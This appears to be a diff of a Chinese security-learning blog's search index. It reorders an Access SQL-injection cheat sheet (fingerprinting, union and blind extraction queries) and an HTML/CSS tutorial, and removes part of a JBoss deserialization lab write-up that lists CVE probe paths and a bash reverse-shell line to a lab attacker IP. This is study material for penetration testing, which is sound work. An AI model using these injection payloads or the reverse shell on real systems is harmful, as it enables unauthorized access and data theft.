@@ -24,71 +24,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Access注入</title>
-    <url>/article/Access%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>端口：无</p>
-<p>没有数据库概念，一个文件就是一个库</p>
-<p>通常是asp+access搭配，只存在联合查询和bool盲注两种注入方式</p>
-<p><strong>Access数据库结构：</strong></p>
-<p>表名-&gt;列名-&gt;内容数据</p>
-<p>asp、aspx通常为mssql或access数据库</p>
-<table>
-<thead>
-<tr>
-<th align="left">判断</th>
-<th align="left">结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><code>and exists (select * from msysobjects)&gt;0</code></td>
-<td align="left">access</td>
-</tr>
-<tr>
-<td align="left"><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code></td>
-<td align="left">mssql</td>
-</tr>
-<tr>
-<td align="left">and sleep(3)</td>
-<td align="left">mysql</td>
-</tr>
-</tbody></table>
-<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">判断数据库类型</td>
-<td align="left"><code>and exists (select * from msysobjects)&gt;0</code> <br>返回正为access数据库 <br><br><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code> <br>返回正常是mssql数据库</td>
-</tr>
-<tr>
-<td align="left">判断注入点</td>
-<td align="left">and 1=1 <br>and 1=0</td>
-</tr>
-<tr>
-<td align="left">判断列数</td>
-<td align="left">order by</td>
-</tr>
-<tr>
-<td align="left">猜解表名、列名</td>
-<td align="left">1、union猜解 <br>猜表名 <br><code>?id=1 union select 1,2,3,4 from 表名</code> <br>猜列名 <br><code>?id=1 union select 1,列名,3,4 from 表名</code> <br><br>2、exists猜解 <br>猜表名 <br><code>?id=1 and exists(select * from 表名)</code> <br>或 <br><code>?id=1 and 0 &lt; &gt; (select count(*) from 表名)</code> <br><br>猜列名 <br><code>?id=1 and exists(select 列名 from 表名)</code></td>
-</tr>
-<tr>
-<td align="left">暴数据</td>
-<td align="left">1、盲注 <br>猜长度： <br><code>?id=1 and (select top 1 len(列名) from 表名)=猜解的长度</code> <br>猜内容： <br><code>?id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;猜解的ascii码值</code>  <br><br>2、移位溢出 <br><code>union select 1,2,3,4,5,6,7,table.* from 表名;</code> <br><code>union select 1,2,3,4,5,6,table.*,7 from 表名;</code> <br><code>union select 1,2,3,4,5,table.*,6,7 from 表名;</code></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>Access</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CSRF</title>
     <url>/article/CSRF/</url>
     <content><![CDATA[<p>CSRF，（Cross-siterequestforgery），跨站请求伪造。</p>
@@ -174,267 +109,68 @@
       </tags>
   </entry>
   <entry>
-    <title>HTML、CSS基础</title>
-    <url>/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1 id="HTML："><a href="#HTML：" class="headerlink" title="HTML："></a>HTML：</h1><p>HTML不是编程语言，而是标记语言，用来描述网页</p>
-<p>HTML基础语法及标签</p>
+    <title>Access注入</title>
+    <url>/article/Access%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>端口：无</p>
+<p>没有数据库概念，一个文件就是一个库</p>
+<p>通常是asp+access搭配，只存在联合查询和bool盲注两种注入方式</p>
+<p><strong>Access数据库结构：</strong></p>
+<p>表名-&gt;列名-&gt;内容数据</p>
+<p>asp、aspx通常为mssql或access数据库</p>
 <table>
 <thead>
 <tr>
-<th>标签</th>
-<th>说明</th>
+<th align="left">判断</th>
+<th align="left">结果</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>&lt;!DOCTYPE&gt;  </code></td>
-<td><code>&lt;!DOCTYPE&gt;  </code>不是HTML标记语言，而是声明，它是指示 web 浏览器关于页面使用哪个  <br>HTML 版本进行编写的指令 <code>&lt;!DOCTYPE  html&gt; </code></td>
+<td align="left"><code>and exists (select * from msysobjects)&gt;0</code></td>
+<td align="left">access</td>
 </tr>
 <tr>
-<td><code>&lt;meta  charset=&quot;utf-8&quot;&gt;  </code></td>
-<td>对于中文网页需要声明编码方式，否则会乱码  <br><code>&lt;meta  charset=&quot;gbk&quot;&gt;</code>  设置gbk编码</td>
+<td align="left"><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code></td>
+<td align="left">mssql</td>
 </tr>
 <tr>
-<td><code> &lt;!---  ---&gt; </code></td>
-<td>注释  <br><code>&lt;!---这是一个注释---&gt;  </code></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>完整的HTML页面</td>
-<td></td>
-</tr>
-<tr>
-<td><code>&lt;!DOCTYPE  html&gt;</code></td>
-<td>声明</td>
-</tr>
-<tr>
-<td><code>&lt;html&gt;&lt;/html&gt; </code></td>
-<td>最外层框架，告知是html框架</td>
-</tr>
-<tr>
-<td><code>&lt;head&gt;&lt;/head&gt;</code></td>
-<td>头部元素，包含编码语言和页面标题</td>
-</tr>
-<tr>
-<td><code>&lt;meta  charset=&quot;utf-8&quot;&gt;</code></td>
-<td>声明编码</td>
-</tr>
-<tr>
-<td><code>&lt;title&gt;&lt;/title&gt;</code></td>
-<td>网页标题  <br><code>&lt;title&gt;Hello&lt;/title&gt;</code></td>
-</tr>
-<tr>
-<td><code>&lt;body&gt;&lt;/body&gt;</code></td>
-<td>网页主题，是网页的内容部分  <br><code>&lt;body&gt;  &lt;p&gt;这是正文&lt;/p&gt;  &lt;/body&gt;</code></td>
-</tr>
-<tr>
-<td>上述标签关系如图，是网页的最小构成单元</td>
-<td><img src="/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" alt="02A7DD95-22B4-4FB9-B994-DDB5393F7F03" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" class="lozad post-image"></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>常用标签</td>
-<td></td>
-</tr>
-<tr>
-<td><code>&lt;h1&gt;&lt;/h1&gt;</code></td>
-<td>标题  h1-h6，标题级别（字体大小）由大到小 <br><code> &lt;h1&gt;这是最大级别标题&lt;/h1&gt;</code></td>
-</tr>
-<tr>
-<td><code>&lt;p&gt;&lt;/p&gt;</code></td>
-<td>段落  <br><code>&lt;p&gt;这是一个段落&lt;/p&gt;</code></td>
-</tr>
-<tr>
-<td><code>&lt;hr&gt;  </code></td>
-<td>线</td>
-</tr>
-<tr>
-<td><code>&lt;pre&gt;&lt;/pre&gt;</code></td>
-<td>预格式化文本容器,会保留空格和换行符</td>
-</tr>
-<tr>
-<td><code>&lt;br/&gt;</code></td>
-<td>换行，直接插入段落，没有闭合标签</td>
-</tr>
-<tr>
-<td><code>&lt;a&gt;&lt;/a&gt;</code></td>
-<td>链接  <br><code>&lt;a  href=&quot;https://www.baidu.com&quot;&gt;这是百度链接&lt;/a&gt;</code></td>
-</tr>
-<tr>
-<td><code>&lt;img&gt; </code></td>
-<td>图片，注意，图片标签不是成对出现  <br><code>&lt;img  src=&quot;1.jpg&quot;&gt;</code></td>
-</tr>
-<tr>
-<td><code>&lt;ul&gt;&lt;/ul&gt;：无序列表</code>  <br><code>&lt;ol&gt;&lt;/ol&gt;：有序列表</code>  <br><code>&lt;li&gt;&lt;/li&gt;：列表项</code></td>
-<td>列表  <br><code>&lt;ol&gt;</code>  <br><code>&lt;li&gt;有序列表1&lt;/li&gt;</code><br><code>&lt;li&gt;有序列表2&lt;/li&gt;</code>  <br><code>&lt;/ol&gt;</code></td>
-</tr>
-<tr>
-<td><code>&lt;table&gt;&lt;/table&gt;：表格</code><br><code>&lt;tr&gt;&lt;/tr&gt;：行</code>  <br><code>&lt;td&gt;&lt;/td&gt;：格</code>  <br><code>&lt;th&gt;&lt;/th&gt;：表格头(加粗加黑) </code></td>
-<td>创建表格  <br><code>&lt;table&gt;</code>   <br><code>&lt;tr&gt;</code>    <br><code>&lt;th&gt;Month&lt;/th&gt;</code>    <code>&lt;th&gt;Savings&lt;/th&gt;</code>   <br><code>&lt;/tr&gt;</code>   <br><br><code>&lt;tr&gt;</code>    <br><code>&lt;td&gt;January&lt;/td&gt;</code>    <code>&lt;td&gt;$100&lt;/td&gt;</code>   <br><code>&lt;/tr&gt;</code>  <br><code>&lt;/table&gt;</code></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>HTML表单</td>
-<td></td>
-</tr>
-<tr>
-<td><code>&lt;form&gt;&lt;/form&gt;</code></td>
-<td>定义表单  <br><code>&lt;form  action=&quot;www.baidu.com&quot; method=&quot;get&quot;  enctype=&quot;application/x-www-form-urlencoded&quot;&gt;</code><br><code>这是表单</code><br><code>&lt;/form&gt;</code>  <br><br>action：表明表单将要提交到哪里  <br>method：表示提交用的方法分别为get和post可选  <br>enctype：规定在发送表单数据前对数据进行编码格式</td>
-</tr>
-<tr>
-<td><code>&lt;INPUT&gt;</code></td>
-<td>表单域标记  <br><code>&lt;INPUT  type= &quot;text&quot; name= &quot;文本框名称&quot; value= &quot;文本框值&quot; size=  &quot;文本框的宽度&quot; maxlength=  &quot;文本框中能输入的最大长度&quot; &gt;</code>  <br>value：输入框默认文本</td>
-</tr>
-<tr>
-<td>type</td>
-<td>表单类型  <br>text：单行文本框  <br>password：密码框，输入值以点代替  <br>checkbox：复选框  <br>radio：单选按钮  <br>submit：提交按钮  <br>button：自定义按钮</td>
-</tr>
-<tr>
-<td>value</td>
-<td>默认文本</td>
-</tr>
-<tr>
-<td>placeholder</td>
-<td>提示文字</td>
-</tr>
-<tr>
-<td><code>&lt;div&gt;&lt;/div&gt;</code></td>
-<td>块元素，可以存放文本、图片等，用来对整体设置属性</td>
-</tr>
-<tr>
-<td><code>&lt;textarea&gt;&lt;/textarea&gt;</code></td>
-<td>格式及属性  <br><code>&lt;TEXTAREA  name= &quot;名称&quot; rows=  &quot;最大可视行数&quot; cols=  &quot;最大可视列数&quot; &gt;默认多行文本</code><br><code> &lt;/TEXTAREA&gt;</code></td>
-</tr>
-<tr>
-<td><code>&lt;select&gt;&lt;/select&gt;  </code><br><code>&lt;option&gt;&lt;/option&gt;</code></td>
-<td>多选表单  <br><code>&lt;SELECT name= &quot;&quot; size= &quot;&quot; &gt; </code><br><code>&lt;OPTION  value= &quot; &quot; &gt; 选项1 &lt;/OPTION&gt;</code><br><code>&lt;OPTION  value= &quot; &quot; &gt; 选项2 &lt;/OPTION&gt; </code><br><code>&lt;/SELECT&gt;</code></td>
+<td align="left">and sleep(3)</td>
+<td align="left">mysql</td>
 </tr>
 </tbody></table>
-<p>补充：</p>
-<p>HTTP请求方式</p>
-<table>
+<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><table>
 <thead>
 <tr>
-<th>方法</th>
-<th>说明</th>
+<th align="left">方法</th>
+<th align="left">语句</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>GET</td>
-<td>发起一个请求来获得服务器上的某一资源，通过一组HTTP头和呈现数据返回客户端，GET请求中永远不会包含呈现数据</td>
+<td align="left">判断数据库类型</td>
+<td align="left"><code>and exists (select * from msysobjects)&gt;0</code> <br>返回正为access数据库 <br><br><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code> <br>返回正常是mssql数据库</td>
 </tr>
 <tr>
-<td>HEAD</td>
-<td>与GET类似，但是HEAD只含有HTTP头信息，不含有呈现数据。侧重判断某个资源是否存在。</td>
+<td align="left">判断注入点</td>
+<td align="left">and 1=1 <br>and 1=0</td>
 </tr>
 <tr>
-<td>POST</td>
-<td>向服务器提交数据，使用最为广泛</td>
+<td align="left">判断列数</td>
+<td align="left">order by</td>
 </tr>
 <tr>
-<td>PUT</td>
-<td>与POST类似，但是PUT指定了资源存放的位置，POST数据存放位置则由服务器决定。少见</td>
+<td align="left">猜解表名、列名</td>
+<td align="left">1、union猜解 <br>猜表名 <br><code>?id=1 union select 1,2,3,4 from 表名</code> <br>猜列名 <br><code>?id=1 union select 1,列名,3,4 from 表名</code> <br><br>2、exists猜解 <br>猜表名 <br><code>?id=1 and exists(select * from 表名)</code> <br>或 <br><code>?id=1 and 0 &lt; &gt; (select count(*) from 表名)</code> <br><br>猜列名 <br><code>?id=1 and exists(select 列名 from 表名)</code></td>
 </tr>
 <tr>
-<td>DELETE</td>
-<td>删除资源。少见。</td>
-</tr>
-<tr>
-<td>OPTIONS</td>
-<td>获取当前URL所支持的方法，若请求成功，会在HTTP头中更包含一个名为Allow的头，值是所支持的方法</td>
-</tr>
-</tbody></table>
-<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><p>CSS是一种用来装饰HTML的标记集合，是对HTML标记的一种扩展，可以进一步美化HTML页面</p>
-<p>语法</p>
-<pre class="highlight"><span class="line">选择符+声明（声明=属性+属性值）</span><br><span class="line"></span><br><span class="line">           属性 值              属性 值</span><br><span class="line"></span><br><span class="line">   h1&#123;   color:red;     front-size:14px&#125;</span><br><span class="line"></span><br><span class="line">  选择器    声明          声明</span><br></pre>
-
-<p>引用方式</p>
-<table>
-<thead>
-<tr>
-<th>方式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>内联样式</td>
-<td>在HTML元素中使用style属性，只对当前标记里的内容有效   <br><code>&lt;p  style=&quot;display:none&quot;&gt;&lt;/p&gt;</code></td>
-</tr>
-<tr>
-<td>内部样式表</td>
-<td>在HTML文档头部head区域使用<code>&lt;style&gt;</code>元素，包含CS，全局声明，调用  <br><code>&lt;style  type=&quot;text/css&quot;&gt; </code><br><code>选择符 &#123; 样式属性:属性值; 样式属性:属性值;……&#125;</code><br><code>选择符 &#123; 样式属性:属性值; 样式属性:属性值;……&#125;</code><br><code>&lt;/style&gt;</code></td>
-</tr>
-<tr>
-<td>外部引用</td>
-<td>外部CSS，通过<code>&lt;link&gt;</code>标签引入外部的CSS文件 <br><code>&lt;link  rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;样式表文件的地址&quot;&gt;</code></td>
-</tr>
-</tbody></table>
-<p>内部样式表总结</p>
-<table>
-<thead>
-<tr>
-<th>样式</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>类选择符</td>
-<td><code>&lt;style  type=&quot;text/css&quot;&gt;  </code><br><code>.sfont&#123;  font-size:12px; </code><br><code>color:red;  &#125;</code><br><code>&lt;/style&gt; </code><br><code>&lt;p  class=&quot;sfont&quot;&gt;…&lt;/p&gt; </code></td>
-</tr>
-<tr>
-<td>ID选择符</td>
-<td><code>&lt;style  type=&quot;text/css&quot;&gt;</code><br><code>#sfont&#123; </code><br><code>font-size:12px;</code><br><code>color:red;  &#125; </code><br><code>&lt;/style&gt; </code>   <br><code>&lt;p id=&quot;sfont&quot;&gt;…&lt;/p&gt;  </code></td>
-</tr>
-<tr>
-<td>类型选择符</td>
-<td><code>&lt;style  type=&quot;text/css&quot;&gt; </code><br><code>p&#123;</code><br><code>font-size:12px;</code><br><code>color:red;  &#125;</code><br><code>&lt;/style&gt;  </code><br><code> &lt;p&gt;…&lt;/p&gt; </code></td>
-</tr>
-</tbody></table>
-<p>样式表冲突</p>
-<p>当多种样式作用于同一标记的同一属性时，会发生样式表冲突</p>
-<p>优先原则</p>
-<p>同一选择符：按就近原则</p>
-<p>不同选择符：内联 &gt; ID &gt; 类 &gt; 类型 &gt; 外部</p>
-<p>定位符</p>
-<table>
-<thead>
-<tr>
-<th>方式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>position</td>
-<td></td>
-</tr>
-<tr>
-<td>fixed<br>绝对定位</td>
-<td><code>&lt;view  style=&#39;position:fixed;bottom:100rpx;right:100rpx&#39;&gt;  </code><br><code>&lt;image style=&#39; width:102rpx;  height:110rpx&#39;  src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;</code></td>
-</tr>
-<tr>
-<td>absolute<br>绝对定位</td>
-<td><code>&lt;view  style=&#39;position:absolute;&#39;&gt; </code><br><code>&lt;image style=&#39; width:102px;  height:110px&#39; src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt; </code> <br>在没有使用 “left”, “top”, “right” 以及 “bottom” 属性之前，基于文档流的位置停留在在文档流之外，  随着滚动并不一直停留在屏幕中。     <br><br><code>&lt;view  style=&#39;position:absolute;bottom:100rpx;right:100rpx&#39;&gt;  </code><br><code>&lt;image style=&#39; width:102rpx;  height:110rpx&#39;  src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;</code>  <br>在使用 “left”, “top”, “right” 以及 “bottom” 属性之后，位置就不是基于文档流时候的位置，  而是根据这些设置的属性基于整个屏幕的位置确定的。随着滚动并不一直停留在屏幕中。</td>
-</tr>
-<tr>
-<td>relative<br>相对定位</td>
-<td><code>&lt;html&gt;  &lt;head&gt; </code><br><code>&lt;style  type=&quot;text/css&quot;&gt;</code><br><code>h2.pos_left  &#123;  position:relative;  left:-20px  &#125; </code><br><code>h2.pos_right  &#123;  position:relative;  left:20px  &#125; </code><br><code>.container&#123;   margin-left:100px;   border:5px solid #405f80;  &#125;</code><br><code>&lt;/style&gt;  &lt;/head&gt;  &lt;body&gt; </code><br><code> &lt;div class=&quot;container&quot;&gt; </code><br><code>   &lt;h2&gt;这是位于正常位置的标题&lt;/h2&gt;  </code><br><code>&lt;h2 class=&quot;pos_left&quot;&gt;这个标题相对于其正常位置向左移动&lt;/h2&gt;  </code><br><code>&lt;h2 class=&quot;pos_right&quot;&gt;这个标题相对于其正常位置向右移动&lt;/h2&gt; </code><br><code>&lt;/div&gt;  &lt;/body&gt;     &lt;/html&gt;  </code></td>
+<td align="left">暴数据</td>
+<td align="left">1、盲注 <br>猜长度： <br><code>?id=1 and (select top 1 len(列名) from 表名)=猜解的长度</code> <br>猜内容： <br><code>?id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;猜解的ascii码值</code>  <br><br>2、移位溢出 <br><code>union select 1,2,3,4,5,6,7,table.* from 表名;</code> <br><code>union select 1,2,3,4,5,6,table.*,7 from 表名;</code> <br><code>union select 1,2,3,4,5,table.*,6,7 from 表名;</code></td>
 </tr>
 </tbody></table>
 ]]></content>
       <categories>
-        <category>编程基础</category>
+        <category>Web渗透</category>
       </categories>
       <tags>
-        <tag>HTML</tag>
-        <tag>CSS</tag>
+        <tag>Access</tag>
       </tags>
   </entry>
   <entry>
@@ -1410,35 +1146,267 @@
       </tags>
   </entry>
   <entry>
-    <title>JBoss反序列化漏洞复现</title>
-    <url>/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
-<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
-<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
-<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
-<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
-<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
-<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
-<p>攻击机：192.168.66.138</p>
-<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
+    <title>HTML、CSS基础</title>
+    <url>/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="HTML："><a href="#HTML：" class="headerlink" title="HTML："></a>HTML：</h1><p>HTML不是编程语言，而是标记语言，用来描述网页</p>
+<p>HTML基础语法及标签</p>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;!DOCTYPE&gt;  </code></td>
+<td><code>&lt;!DOCTYPE&gt;  </code>不是HTML标记语言，而是声明，它是指示 web 浏览器关于页面使用哪个  <br>HTML 版本进行编写的指令 <code>&lt;!DOCTYPE  html&gt; </code></td>
+</tr>
+<tr>
+<td><code>&lt;meta  charset=&quot;utf-8&quot;&gt;  </code></td>
+<td>对于中文网页需要声明编码方式，否则会乱码  <br><code>&lt;meta  charset=&quot;gbk&quot;&gt;</code>  设置gbk编码</td>
+</tr>
+<tr>
+<td><code> &lt;!---  ---&gt; </code></td>
+<td>注释  <br><code>&lt;!---这是一个注释---&gt;  </code></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>完整的HTML页面</td>
+<td></td>
+</tr>
+<tr>
+<td><code>&lt;!DOCTYPE  html&gt;</code></td>
+<td>声明</td>
+</tr>
+<tr>
+<td><code>&lt;html&gt;&lt;/html&gt; </code></td>
+<td>最外层框架，告知是html框架</td>
+</tr>
+<tr>
+<td><code>&lt;head&gt;&lt;/head&gt;</code></td>
+<td>头部元素，包含编码语言和页面标题</td>
+</tr>
+<tr>
+<td><code>&lt;meta  charset=&quot;utf-8&quot;&gt;</code></td>
+<td>声明编码</td>
+</tr>
+<tr>
+<td><code>&lt;title&gt;&lt;/title&gt;</code></td>
+<td>网页标题  <br><code>&lt;title&gt;Hello&lt;/title&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;body&gt;&lt;/body&gt;</code></td>
+<td>网页主题，是网页的内容部分  <br><code>&lt;body&gt;  &lt;p&gt;这是正文&lt;/p&gt;  &lt;/body&gt;</code></td>
+</tr>
+<tr>
+<td>上述标签关系如图，是网页的最小构成单元</td>
+<td><img src="/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" alt="02A7DD95-22B4-4FB9-B994-DDB5393F7F03" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" class="lozad post-image"></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>常用标签</td>
+<td></td>
+</tr>
+<tr>
+<td><code>&lt;h1&gt;&lt;/h1&gt;</code></td>
+<td>标题  h1-h6，标题级别（字体大小）由大到小 <br><code> &lt;h1&gt;这是最大级别标题&lt;/h1&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;p&gt;&lt;/p&gt;</code></td>
+<td>段落  <br><code>&lt;p&gt;这是一个段落&lt;/p&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;hr&gt;  </code></td>
+<td>线</td>
+</tr>
+<tr>
+<td><code>&lt;pre&gt;&lt;/pre&gt;</code></td>
+<td>预格式化文本容器,会保留空格和换行符</td>
+</tr>
+<tr>
+<td><code>&lt;br/&gt;</code></td>
+<td>换行，直接插入段落，没有闭合标签</td>
+</tr>
+<tr>
+<td><code>&lt;a&gt;&lt;/a&gt;</code></td>
+<td>链接  <br><code>&lt;a  href=&quot;https://www.baidu.com&quot;&gt;这是百度链接&lt;/a&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;img&gt; </code></td>
+<td>图片，注意，图片标签不是成对出现  <br><code>&lt;img  src=&quot;1.jpg&quot;&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;ul&gt;&lt;/ul&gt;：无序列表</code>  <br><code>&lt;ol&gt;&lt;/ol&gt;：有序列表</code>  <br><code>&lt;li&gt;&lt;/li&gt;：列表项</code></td>
+<td>列表  <br><code>&lt;ol&gt;</code>  <br><code>&lt;li&gt;有序列表1&lt;/li&gt;</code><br><code>&lt;li&gt;有序列表2&lt;/li&gt;</code>  <br><code>&lt;/ol&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;table&gt;&lt;/table&gt;：表格</code><br><code>&lt;tr&gt;&lt;/tr&gt;：行</code>  <br><code>&lt;td&gt;&lt;/td&gt;：格</code>  <br><code>&lt;th&gt;&lt;/th&gt;：表格头(加粗加黑) </code></td>
+<td>创建表格  <br><code>&lt;table&gt;</code>   <br><code>&lt;tr&gt;</code>    <br><code>&lt;th&gt;Month&lt;/th&gt;</code>    <code>&lt;th&gt;Savings&lt;/th&gt;</code>   <br><code>&lt;/tr&gt;</code>   <br><br><code>&lt;tr&gt;</code>    <br><code>&lt;td&gt;January&lt;/td&gt;</code>    <code>&lt;td&gt;$100&lt;/td&gt;</code>   <br><code>&lt;/tr&gt;</code>  <br><code>&lt;/table&gt;</code></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>HTML表单</td>
+<td></td>
+</tr>
+<tr>
+<td><code>&lt;form&gt;&lt;/form&gt;</code></td>
+<td>定义表单  <br><code>&lt;form  action=&quot;www.baidu.com&quot; method=&quot;get&quot;  enctype=&quot;application/x-www-form-urlencoded&quot;&gt;</code><br><code>这是表单</code><br><code>&lt;/form&gt;</code>  <br><br>action：表明表单将要提交到哪里  <br>method：表示提交用的方法分别为get和post可选  <br>enctype：规定在发送表单数据前对数据进行编码格式</td>
+</tr>
+<tr>
+<td><code>&lt;INPUT&gt;</code></td>
+<td>表单域标记  <br><code>&lt;INPUT  type= &quot;text&quot; name= &quot;文本框名称&quot; value= &quot;文本框值&quot; size=  &quot;文本框的宽度&quot; maxlength=  &quot;文本框中能输入的最大长度&quot; &gt;</code>  <br>value：输入框默认文本</td>
+</tr>
+<tr>
+<td>type</td>
+<td>表单类型  <br>text：单行文本框  <br>password：密码框，输入值以点代替  <br>checkbox：复选框  <br>radio：单选按钮  <br>submit：提交按钮  <br>button：自定义按钮</td>
+</tr>
+<tr>
+<td>value</td>
+<td>默认文本</td>
+</tr>
+<tr>
+<td>placeholder</td>
+<td>提示文字</td>
+</tr>
+<tr>
+<td><code>&lt;div&gt;&lt;/div&gt;</code></td>
+<td>块元素，可以存放文本、图片等，用来对整体设置属性</td>
+</tr>
+<tr>
+<td><code>&lt;textarea&gt;&lt;/textarea&gt;</code></td>
+<td>格式及属性  <br><code>&lt;TEXTAREA  name= &quot;名称&quot; rows=  &quot;最大可视行数&quot; cols=  &quot;最大可视列数&quot; &gt;默认多行文本</code><br><code> &lt;/TEXTAREA&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;select&gt;&lt;/select&gt;  </code><br><code>&lt;option&gt;&lt;/option&gt;</code></td>
+<td>多选表单  <br><code>&lt;SELECT name= &quot;&quot; size= &quot;&quot; &gt; </code><br><code>&lt;OPTION  value= &quot; &quot; &gt; 选项1 &lt;/OPTION&gt;</code><br><code>&lt;OPTION  value= &quot; &quot; &gt; 选项2 &lt;/OPTION&gt; </code><br><code>&lt;/SELECT&gt;</code></td>
+</tr>
+</tbody></table>
+<p>补充：</p>
+<p>HTTP请求方式</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>发起一个请求来获得服务器上的某一资源，通过一组HTTP头和呈现数据返回客户端，GET请求中永远不会包含呈现数据</td>
+</tr>
+<tr>
+<td>HEAD</td>
+<td>与GET类似，但是HEAD只含有HTTP头信息，不含有呈现数据。侧重判断某个资源是否存在。</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>向服务器提交数据，使用最为广泛</td>
+</tr>
+<tr>
+<td>PUT</td>
+<td>与POST类似，但是PUT指定了资源存放的位置，POST数据存放位置则由服务器决定。少见</td>
+</tr>
+<tr>
+<td>DELETE</td>
+<td>删除资源。少见。</td>
+</tr>
+<tr>
+<td>OPTIONS</td>
+<td>获取当前URL所支持的方法，若请求成功，会在HTTP头中更包含一个名为Allow的头，值是所支持的方法</td>
+</tr>
+</tbody></table>
+<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><p>CSS是一种用来装饰HTML的标记集合，是对HTML标记的一种扩展，可以进一步美化HTML页面</p>
+<p>语法</p>
+<pre class="highlight"><span class="line">选择符+声明（声明=属性+属性值）</span><br><span class="line"></span><br><span class="line">           属性 值              属性 值</span><br><span class="line"></span><br><span class="line">   h1&#123;   color:red;     front-size:14px&#125;</span><br><span class="line"></span><br><span class="line">  选择器    声明          声明</span><br></pre>
 
-<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)</a></p>
